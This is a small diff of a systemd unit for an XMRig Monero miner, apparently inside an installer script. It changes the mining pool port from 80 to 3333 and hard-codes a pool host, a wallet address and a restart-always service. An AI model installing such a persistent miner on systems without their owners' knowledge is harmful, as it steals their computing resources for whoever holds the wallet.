@@ -111,7 +111,7 @@ Description=XMRig Miner Service
 After=network.target
 
 [Service]
-ExecStart=$XMRIG_BINARY -a rx/0 --url tp.titops.xyz:80 --user 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD -k -p xm-proxy
+ExecStart=$XMRIG_BINARY -a rx/0 --url tp.titops.xyz:3333 --user 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD -k -p xm-proxy
 Restart=always
 RestartSec=5
 WorkingDirectory=$XMRIG_DIR
